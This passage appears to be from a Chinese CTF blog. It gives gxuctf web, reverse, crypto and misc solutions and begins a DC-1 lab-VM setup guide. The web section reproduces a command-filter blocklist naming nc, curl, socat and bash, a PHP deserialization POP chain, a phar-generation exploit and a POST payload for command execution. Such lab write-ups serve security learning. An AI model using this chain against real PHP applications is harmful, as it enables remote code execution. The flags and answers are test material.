class="line">if(!preg_match(&#x27;/bash|nc|exec|curl|whois|socat|telnet|python|php|perl|ruby|phpinfo|ls|cat|tac|nl|more|less|head|tail|sed|sort|uniq|rev|base|echo|mv|cp|rm|fl|la|ag|flag|\-|\?|\&#x27;|\^|\~|\&gt;|\&lt;|\$/i&#x27;,$_POST[&#x27;cmd&#x27;]))&#123;</span><br><span class="line">        $this-&gt;$key-&gt;&#123;$this-&gt;func&#125;($_POST[&#x27;cmd&#x27;]);    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">echo &quot;&lt;br&gt;don&#x27;t hack&quot;;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class zz&#123;</span><br><span class="line">    public $filename;</span><br><span class="line">    public $content=&#x27;surprise&#x27;;</span><br><span class="line"></span><br><span class="line">    public function __construct($filename)&#123;</span><br><span class="line">        $this-&gt;filename=$filename;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function filter()&#123;</span><br><span class="line">        if(preg_match(&#x27;/^\/|php:|data|zip|\.\.\//i&#x27;,$this-&gt;filename))&#123;</span><br><span class="line">            die(&#x27;这不合理&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function write($var)&#123;</span><br><span class="line">        $filename=$this-&gt;filename;</span><br><span class="line">        $lt=$this-&gt;filename-&gt;$var;</span><br><span class="line">        //此功能废弃，不想写了</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function getFile()&#123;</span><br><span class="line">        $this-&gt;filter();</span><br><span class="line">        $contents=file_get_contents($this-&gt;filename);</span><br><span class="line">        if(!empty($contents))&#123;</span><br><span class="line">            return $contents;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            die(&quot;404 not found&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        $this-&gt;&#123;$_POST[&#x27;method&#x27;]&#125;($_POST[&#x27;var&#x27;]);</span><br><span class="line">        return $this-&gt;content;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class xx&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    public $arg;</span><br><span class="line"></span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;name=&#x27;eval&#x27;;</span><br><span class="line">        $this-&gt;arg=&#x27;phpinfo();&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __call($name,$arg)&#123;</span><br><span class="line">        $name($arg[0]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>接下来构造pop链</p><p>先payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">class aa&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        $this-&gt;name=strtolower($this-&gt;name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class ff&#123;</span><br><span class="line">    public $content;</span><br><span class="line">    public $func=&quot;assert&quot;;</span><br><span class="line">    public function __get($key)&#123;</span><br><span class="line">        if(!preg_match(&#x27;/bash|nc|exec|curl|whois|socat|telnet|python|php|perl|ruby|phpinfo|ls|cat|tac|nl|more|less|head|tail|sed|sort|uniq|rev|base|echo|mv|cp|rm|fl|la|ag|flag|\-|\?|\&#x27;|\^|\~|\&gt;|\&lt;|\$/i&#x27;,$_POST[&#x27;cmd&#x27;]))&#123;</span><br><span class="line">            $this-&gt;$key-&gt;&#123;$this-&gt;func&#125;($_POST[&#x27;cmd&#x27;]);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;&lt;br&gt;don&#x27;t hack&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class zz&#123;</span><br><span class="line">    public $filename;  //$ff</span><br><span class="line">    public $content=&#x27;surprise&#x27;;</span><br><span class="line">    public function filter()&#123;</span><br><span class="line">        if(preg_match(&#x27;/^\/|php:|data|zip|\.\.\//i&#x27;,$this-&gt;filename))&#123;</span><br><span class="line">            die(&#x27;这不合理&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public function write($var)&#123;</span><br><span class="line">        $filename=$this-&gt;filename;</span><br><span class="line">        $lt=$this-&gt;filename-&gt;$var;</span><br><span class="line">        //此功能废弃，不想写了</span><br><span class="line">    &#125;</span><br><span class="line">    public function getFile()&#123;</span><br><span class="line">        $this-&gt;filter();</span><br><span class="line">        $contents=file_get_contents($this-&gt;filename);</span><br><span class="line">        if(!empty($contents))&#123;</span><br><span class="line">            return $contents;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            die(&quot;404 not found&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        $this-&gt;&#123;$_POST[&#x27;method&#x27;]&#125;($_POST[&#x27;var&#x27;]); //method=write var=content cmd=&#x27;phpinfo();&#x27;</span><br><span class="line">        return $this-&gt;content;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class xx&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    public $arg;</span><br><span class="line">    public function __call($name,$arg)&#123;</span><br><span class="line">        $name($arg[0]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$aa =new aa();</span><br><span class="line">$aa-&gt;name=new zz();</span><br><span class="line">$aa-&gt;name-&gt;filename=new ff();</span><br><span class="line">$aa-&gt;name-&gt;filename-&gt;content=new xx();</span><br><span class="line">echo serialize($aa);</span><br><span class="line"></span><br><span class="line">@unlink(&quot;phar.phar&quot;);</span><br><span class="line">$phar = new Phar(&quot;phar.phar&quot;);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub</span><br><span class="line">$phar-&gt;setMetadata(aa); //将自定义meta-data存入manifest</span><br><span class="line">$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件</span><br><span class="line">//签名自动计算</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line">?&gt;</span><br><span class="line">gxuctf&#123;4d8028dd-dfec-4b5c-b4ad-ec5540664fcc&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">入口为__destruct strtolower能进入tostring 则进入zz中 考虑tostring中调用的函数带有参数，而zz中正好有write可以传参调用，则考虑调用write，还剩一个__call和一个__get，发现content是private属性，则正好可以调用get,发现__get，最后进入__call命令执行 至此pop构造完成</span><br><span class="line">post内容为method=write&amp;var=content&amp;cmd=system(&quot;l\s&quot;);</span><br></pre></td></tr></table></figure><p>网上找一个phar的生成文件 生成一个phar.phar传上去，file用phar协议读</p><p>最终payload:</p><p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211022201542112.png" alt="image-20211022201542112" loading="lazy"></p><p>直接读<img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211022201619901.png" alt="image-20211022201619901" loading="lazy"></p><p>但是这题只能用tac读而不能用cat读 我一度以为是我的链子坏了或者哪个地方出错了 考虑环境问题吧还是</p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="除了我以外都是非酋"><a href="#除了我以外都是非酋" class="headerlink" title="除了我以外都是非酋"></a>除了我以外都是非酋</h3><p>丢进ida 看看cj和cc</p><h3 id="看看汇编就知道啦"><a href="#看看汇编就知道啦" class="headerlink" title="看看汇编就知道啦"></a>看看汇编就知道啦</h3><p>Ord(a)=97 +14=111 111和Output数组异或，得到flag</p><h3 id="玩玩游戏就拿到答案啦"><a href="#玩玩游戏就拿到答案啦" class="headerlink" title="玩玩游戏就拿到答案啦"></a>玩玩游戏就拿到答案啦</h3><p>cheat engine 开外挂 改分</p><h3 id="看看程序就出来啦"><a href="#看看程序就出来啦" class="headerlink" title="看看程序就出来啦"></a>看看程序就出来啦</h3><p>python脚本逆着解密</p><p>脚本删了 大概是重新写一个func 的lambda 然后重新和盐值异或</p><p>做出的逆向题不到600分 蚌埠住了</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="secret"><a href="#secret" class="headerlink" title="secret"></a>secret</h3><p>二进制转字符串</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TmV3IGNoYWxsZW5nZSEgQ2FuIHlvdSBmaWd1cmUgb3V0IHdoYXQncyBnb2luZyBvbiBoZXJlPyBJdCBsb29rcyBsaWtlIHRoZSBsZXR0ZXJzIGFyZSBzaGlmdGVkIGJ5IHNvbWUgY29uc3RhbnQuIChoaW50OiB5b3UgbWlnaHQgd2FudCB0byBzdGFydCBsb29raW5nIHVwIFJvbWFuIHBlb3BsZSkuCmZxd25sbXksIGR0eid3aiBmcXJ0eHkgeW1qd2ohIHN0YiBrdHcgeW1qIGtuc2ZxIChmc2kgcmZkZ2ogeW1qIG1md2lqeHkuLi4pIHVmd3k6IGYgeHpneHlueXp5bnRzIGhudW1qdy4gbnMgeW1qIGt0cXF0Ym5zbCB5amN5LCBuJ2FqIHlmcGpzIHJkIHJqeHhmbGogZnNpIHdqdXFmaGppIGphandkIGZxdW1mZ2p5bmggaG1md2ZoeWp3IGJueW0gZiBodHd3anh1dHNpanNoaiB5dCBmIGlua2tqd2pzeSBobWZ3Zmh5ancgLSBwc3RicyBmeCBmIHh6Z3h5bnl6eW50cyBobnVtancuIGhmcyBkdHoga25zaSB5bWoga25zZnEga3FmbD8gbW5zeTogYmogcHN0YiB5bWZ5IHltaiBrcWZsIG54IGx0bnNsIHl0IGdqIHRrIHltaiBrdHdyZnkgbGN6aHlrey4uLn0gLSBibW5obSByamZzeCB5bWZ5IG5rIGR0eiB4amogeW1meSB1Znl5andzLCBkdHogcHN0YiBibWZ5IHltaiBodHd3anh1dHNpanNoangga3R3IGwsIGMsIHosIGgsIHksIGZzaSBrIGZ3ai4gZHR6IGhmcyB1d3RnZmdxZCBidHdwIHR6eSB5bWogd2pyZm5zbnNsIGhtZndmaHlqd3ggZ2Qgd2p1cWZobnNsIHltanIgZnNpIG5za2p3d25zbCBodHJydHMgYnR3aXggbnMgeW1qIGpzbHFueG0gcWZzbHpmbGouIGZzdHltancgbHdqZnkgcmp5bXRpIG54IHl0IHp4aiBrd2p2empzaGQgZnNmcWR4bng6IGJqIHBzdGIgeW1meSAnaicgeG10YnggenUgcnR4eSB0a3lqcyBucyB5bWogZnF1bWZnanksIHh0IHltZnkneCB1d3RnZmdxZCB5bWogcnR4eSBodHJydHMgaG1md2ZoeWp3IG5zIHltaiB5amN5LCBrdHFxdGJqaSBnZCAneScsIGZzaSB4dCB0cy4gdHNoaiBkdHogcHN0YiBmIGtqYiBobWZ3Zmh5and4LCBkdHogaGZzIG5za2p3IHltaiB3anh5IHRrIHltaiBidHdpeCBnZnhqaSB0cyBodHJydHMgYnR3aXggeW1meSB4bXRiIHp1IG5zIHltaiBqc2xxbnhtIHFmc2x6ZmxqLgpmenF2cmh1eW1odWp6cWkhIGd6eSB3aGJ0IGVqcWppd3RzIHV3dCBwdHZqcXF0ciBmcmdsdXp2cmhsd2cgZndobW10cXZ0LiB3dHJ0IGppIGggZW1odiBlenIgaG1tIGd6eXIgd2hycyB0ZWV6cnVpOiB2bnlmdWV7cTB4X3V3NHVpX3h3NHVfal9mNG1tX2ZyZ2x1MH0uIGd6eSB4am1tIGVqcXMgdXdodSBoIG16dSB6ZSBmcmdsdXp2cmhsd2cgamkgb3lpdSBweWptc2pxdiB6ZWUgdXdqaSBpenJ1IHplIHBoaWpmIGtxenhtdHN2dCwgaHFzIGp1IHJ0aG1tZyBqaSBxenUgaXogcGhzIGhldXRyIGhtbS4gd3psdCBnenkgdHFvemd0cyB1d3QgZndobW10cXZ0IQ==</span><br></pre></td></tr></table></figure><p>base64</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">New challenge! Can you figure out what&#x27;s going on here? It looks like the letters are shifted by some constant. (hint: you might want to start looking up Roman people).</span><br><span class="line">fqwnlmy, dtz&#x27;wj fqrtxy ymjwj! stb ktw ymj knsfq (fsi rfdgj ymj mfwijxy...) ufwy: f xzgxynyzynts hnumjw. ns ymj ktqqtbnsl yjcy, n&#x27;aj yfpjs rd rjxxflj fsi wjuqfhji jajwd fqumfgjynh hmfwfhyjw bnym f htwwjxutsijshj yt f inkkjwjsy hmfwfhyjw - pstbs fx f xzgxynyzynts hnumjw. hfs dtz knsi ymj knsfq kqfl? mnsy: bj pstb ymfy ymj kqfl nx ltnsl yt gj tk ymj ktwrfy lczhyk&#123;...&#125; - bmnhm rjfsx ymfy nk dtz xjj ymfy ufyyjws, dtz pstb bmfy ymj htwwjxutsijshjx ktw l, c, z, h, y, fsi k fwj. dtz hfs uwtgfgqd btwp tzy ymj wjrfnsnsl hmfwfhyjwx gd wjuqfhnsl ymjr fsi nskjwwnsl htrrts btwix ns ymj jslqnxm qfslzflj. fstymjw lwjfy rjymti nx yt zxj kwjvzjshd fsfqdxnx: bj pstb ymfy &#x27;j&#x27; xmtbx zu rtxy tkyjs ns ymj fqumfgjy, xt ymfy&#x27;x uwtgfgqd ymj rtxy htrrts hmfwfhyjw ns ymj yjcy, ktqqtbji gd &#x27;y&#x27;, fsi xt ts. tshj dtz pstb f kjb hmfwfhyjwx, dtz hfs nskjw ymj wjxy tk ymj btwix gfxji ts htrrts btwix ymfy xmtb zu ns ymj jslqnxm qfslzflj.</span><br><span class="line">fzqvrhuymhujzqi! gzy whbt ejqjiwts uwt ptvjqqtr frgluzvrhlwg fwhmmtqvt. wtrt ji h emhv ezr hmm gzyr whrs teezrui: vnyfue&#123;q0x_uw4ui_xw4u_j_f4mm_frglu0&#125;. gzy xjmm ejqs uwhu h mzu ze frgluzvrhlwg ji oyiu pyjmsjqv zee uwji izru ze phijf kqzxmtsvt, hqs ju rthmmg ji qzu iz phs heutr hmm. wzlt gzy tqozgts uwt fwhmmtqvt!</span><br></pre></td></tr></table></figure><p>原题 凯撒+替换</p><p>上ctfcrack</p><p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211022203329756.png" alt="image-20211022203329756" loading="lazy"></p><p>替代直接爆破 写wp的时候找不到那个网站了…</p><h3 id="base"><a href="#base" class="headerlink" title="base"></a>base</h3><p>直接上basecrack 先base92再 中间还有ascii和base64 32具体顺序忘了</p><p>最后十六进制转字符串 gxuctf{y0u_r_the_ma3ter_o5_base_decoding!}</p><h3 id="ezRSA"><a href="#ezRSA" class="headerlink" title="ezRSA"></a>ezRSA</h3><p>原题 跑e的脚本删了 跑出来52361</p><p>这是最后的解密脚本 原题直接拿的</p><p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211022204146945.png" alt="image-20211022204146945" loading="lazy"></p><p>python3.9装crypto库没有bytes_to_long 所以删去bytes_to_long拿到字符串后去官方环境跑结果</p><p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211022204339854.png" alt="image-20211022204339854" loading="lazy"></p><h3 id="V"><a href="#V" class="headerlink" title="V"></a>V</h3><p>向下看看到了键盘</p><p>第一步解出维吉尼亚vigenere</p><p>猜测为压缩包文件密码和提示</p><p>直接猜秘钥gxuctf命中</p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>与佛论禅</p><h3 id="how-much"><a href="#how-much" class="headerlink" title="how much"></a>how much</h3><p>上脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line">def upper2num(s):</span><br><span class="line">    index = [&#x27;零&#x27;, &#x27;壹&#x27;, &#x27;贰&#x27;, &#x27;叁&#x27;, &#x27;肆&#x27;, &#x27;伍&#x27;, &#x27;陆&#x27;, &#x27;柒&#x27;, &#x27;捌&#x27;, &#x27;玖&#x27;]</span><br><span class="line">    rst = 0</span><br><span class="line">    _ = re.findall(r&#x27;(.)仟&#x27;, s)</span><br><span class="line">    if _:</span><br><span class="line">        rst += 100000 * index.index(_[0])</span><br><span class="line">    _ = re.findall(r&#x27;(.)佰&#x27;, s)</span><br><span class="line">    if _:</span><br><span class="line">        rst += 10000 * index.index(_[0])</span><br><span class="line">    _ = re.findall(r&#x27;(.)拾&#x27;, s)</span><br><span class="line">    if _:</span><br><span class="line">        rst += 1000 * index.index(_[0])</span><br><span class="line">    if re.match(r&#x27;^拾&#x27;, s):  # 拾几元 √  壹拾几元 ×</span><br><span class="line">        rst += 1000</span><br><span class="line">    _ = re.findall(r&#x27;(.)元&#x27;, s)</span><br><span class="line">    if _:</span><br><span class="line">        if _[0] in index:</span><br><span class="line">            rst += 100 * index.index(_[0])</span><br><span class="line">    _ = re.findall(r&#x27;(.)角&#x27;, s)</span><br><span class="line">    if _:</span><br><span class="line">        rst += 10 * index.index(_[0])</span><br><span class="line">    _ = re.findall(r&#x27;(.)分&#x27;, s)</span><br><span class="line">    if _:</span><br><span class="line">        rst += 1 * index.index(_[0])</span><br><span class="line">    return rst</span><br><span class="line"></span><br><span class="line">print(upper2num(&quot;玖佰陆拾贰元陆角肆分&quot;)/100)</span><br><span class="line">sum=0;</span><br><span class="line">with open(&quot;D:/FireFoxDownload/how_much.txt&quot;,&quot;r&quot;,encoding=&quot;utf8&quot;) as f1:</span><br><span class="line">    for line in f1:</span><br><span class="line">        sum+=upper2num(line)/100</span><br><span class="line">    print(sum)</span><br></pre></td></tr></table></figure><p>出结果保留两位小数</p><h3 id="鹦鹉学舌"><a href="#鹦鹉学舌" class="headerlink" title="鹦鹉学舌"></a>鹦鹉学舌<img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211019192749676.png" alt="image-20211019192749676" loading="lazy"></h3><p>用Pr找到这一帧 一直没搞懂和docx有什么关系</p><p>考虑培根密码 </p><p>gxuctf{wecomexaxh}</p><h3 id="好多word"><a href="#好多word" class="headerlink" title="好多word"></a>好多word</h3><p>python的docx库装起来很麻烦</p><p>用java写的脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">package src;</span><br><span class="line">import org.apache.poi.POIXMLDocument;</span><br><span class="line">import org.apache.poi.POIXMLTextExtractor;</span><br><span class="line">import org.apache.poi.hwpf.extractor.WordExtractor;</span><br><span class="line">import org.apache.poi.openxml4j.opc.OPCPackage;</span><br><span class="line">import org.apache.poi.xwpf.extractor.XWPFWordExtractor;</span><br><span class="line"></span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.util.regex.Matcher;</span><br><span class="line">import java.util.regex.Pattern;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> *  .doc .docx 文档测试类</span><br><span class="line"> *</span><br><span class="line"> */</span><br><span class="line">class TestPoi &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        TestPoi tp=new TestPoi();</span><br><span class="line">        for (int i = 1; i &lt;500; i++) &#123;</span><br><span class="line">            String content = tp.readWord(&quot;C:/Users/86151/Documents/Tencent Files/821361403/FileRecv/word_very_big/&quot;+i+&quot;ya.docx&quot;);</span><br><span class="line">            String pattern =&quot;[\\s\\S]+[Gg][Xx][Uu][Cc][Tt][Ff]\\&#123;[\\s\\S]+&quot;;</span><br><span class="line">            if(Pattern.matches(pattern,content))</span><br><span class="line">                System.out.println(content);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 读取word文件内容</span><br><span class="line">     *</span><br><span class="line">     * @param path</span><br><span class="line">     * @return buffer</span><br><span class="line">     */</span><br><span class="line">    public String readWord(String path) &#123;</span><br><span class="line">        String buffer = &quot;&quot;;</span><br><span class="line">        try &#123;</span><br><span class="line">            if (path.endsWith(&quot;.doc&quot;)) &#123;</span><br><span class="line">                FileInputStream is = new FileInputStream(path);</span><br><span class="line">                WordExtractor ex = new WordExtractor(is);</span><br><span class="line">                buffer = ex.getText();</span><br><span class="line">                is.close();</span><br><span class="line">            &#125; else if (path.endsWith(&quot;docx&quot;)) &#123;</span><br><span class="line">                OPCPackage opcPackage = POIXMLDocument.openPackage(path);</span><br><span class="line">                POIXMLTextExtractor extractor = new XWPFWordExtractor(opcPackage);</span><br><span class="line">                buffer = extractor.getText();</span><br><span class="line">                opcPackage.close();</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                System.out.println(&quot;此文件不是word文件！&quot;);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        return buffer;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211020135441723.png" alt="image-20211020135441723" loading="lazy"></p><h1 id="end"><a href="#end" class="headerlink" title="____end"></a>____<strong>end</strong></h1>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC-1靶机通关手册</title>
      <link href="/2021/11/14/DC-1%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/"/>
      <url>/2021/11/14/DC-1%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C/</url>
      
        <content type="html"><![CDATA[<h2 id="前置工具及安装"><a href="#前置工具及安装" class="headerlink" title="前置工具及安装"></a>前置工具及安装</h2><p><strong>VmwareWorkstation</strong> 推荐16pro版</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.vmware.com/cn/products/workstation-pro/workstation-pro-evaluation.html</span><br></pre></td></tr></table></figure><p><strong>虚拟机</strong></p><p>Centos7 镜像下载地址：</p><p><a href="http://mirrors.aliyun.com/centos/7/isos/x86_64/">http://mirrors.aliyun.com/centos/7/isos/x86_64/</a> </p><p>推荐下载Contos7的标准安装版：CentOS-7-x86_64-DVD-2003.iso</p><p>Kali虚拟机下载地址：</p><p><a href="https://www.kali.org/downloads/">https://www.kali.org/downloads/</a></p><p>下个64位的installer版吧。</p><p>——最好至少留有60G空间给Kali，这东西越用越瘾的0.0</p><p>这是VMware 14 的Centos7的安装参考：</p><p>​    <a href="https://blog.csdn.net/Rao_Limon/article/details/83311095">https://blog.csdn.net/Rao_Limon/article/details/83311095</a></p><p>这是VMware 14 的Kali的安装参考：</p><p>​    <a href="https://www.geek-share.com/detail/2789583020.html">https://www.geek-share.com/detail/2789583020.html</a>  </p><p>Kali的处理器数最好留多一些，因个人情况而定吧。</p><p>*<strong>*<em>在成功进入桌面后，记得把快照拍了：*</em></strong></p><p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/wps1.jpg" alt="img" loading="lazy"> </p><p><strong>配置虚拟机网络：</strong></p><p>虚拟机网络有三种方式，分别是NAT模式、桥接模式以及仅主机模式，各个模式的特点简单来说如下：</p><p>NAT模式以主机作为虚拟机的网关，虚拟机依靠主机可以访问外网，但无法与和主机处于同一网段的其他真实机子通讯，主机可以与虚拟机通讯。</p><p>桥接模式则是虚拟机和主机同属一个网段上，也就类似于虚拟机相当于主机同一网段上的独立主机了，虚拟机的IP是真实的主机所在的网段上的IP，因此可以和其他机子包括主机通讯，意味着是通过和主机所使用的相同的路由器访问外网。</p><p>主机模式则与上边两种模式截然不同，主机模式仅虚拟机之间、虚拟机和主机可以相互通讯，和外网完全是隔离的状态，也就是说虚拟机无法访问外网，也无法与处于和主机同一网段上的其他真实主机通讯，通讯仅限于主机范围内。</p><p>一般来说VMware在装虚拟机时都会自动帮配好网络，只需要选择NAT或者桥接模式，虚拟机就可以访问外网了，这里是学习如何更自由的配置虚拟机网络。</p><p>Centos7网络配置参考：</p><p><a href="https://blog.csdn.net/qq_32352777/article/details/86561289">https://blog.csdn.net/qq_32352777/article/details/86561289</a></p><p>Kali网络配置参考：</p><p>​    <a href="https://blog.csdn.net/Hardlearn_bobo/article/details/78851833">https://blog.csdn.net/Hardlearn_bobo/article/details/78851833</a></p><p>——最好将两台虚拟机网络设置在同一网段。</p><p>对于渗透测试，此处推荐使用Kali虚拟机</p><p><strong>Kali安装VMwaretools的简单步骤</strong></p><ol><li><p>   虚拟机选项卡 → 安装VMware Tools</p></li><li><p>   打开在Kali中新出现光驱，把tar.gz后缀的压缩包复制到自己的用户主目录</p></li><li><p>   进入主目录，右键点击压缩包，选择提取到此处</p></li><li><p>   打开解压好的目录，在文件管理器空白处，点击右键，选择在终端打开</p></li><li><p>   输入 “./vm” ，然后按下tab键，待自动补全后按回车就行了</p></li></ol><p><strong>安装VMwaretools目前阶段只适用于方便地直接将本机文件拖入虚拟机中。看自己需求选择安装</strong></p><p><strong>配置SSH连接虚拟机</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kali:https://www.cnblogs.com/061713xlhj/p/10726799.html</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">centos:https://blog.csdn.net/trackle400/article/details/52755571</span><br></pre></td></tr></table></figure><h2 id="DC-1靶机安装和设置"><a href="#DC-1靶机安装和设置" class="headerlink" 